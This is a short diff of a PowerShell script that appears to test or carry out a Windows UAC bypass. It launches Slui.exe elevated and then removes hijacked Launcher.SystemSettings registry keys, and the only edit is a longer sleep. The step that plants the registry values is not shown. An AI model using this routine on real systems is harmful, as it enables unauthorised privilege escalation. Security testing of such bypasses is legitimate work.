@@ -85,7 +85,7 @@ If($CheckVuln -eq $True){
    ### Start vulnerable process {using powershell}
    Start-Sleep -Seconds 2;Start-Process "$env:WINDIR\System32\Slui.exe" -Verb runas
 
-   Start-Sleep -Seconds 1
+   Start-Sleep -Seconds 2
    ### Revert Regedit to 'DEFAULT' settings after all testings done ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
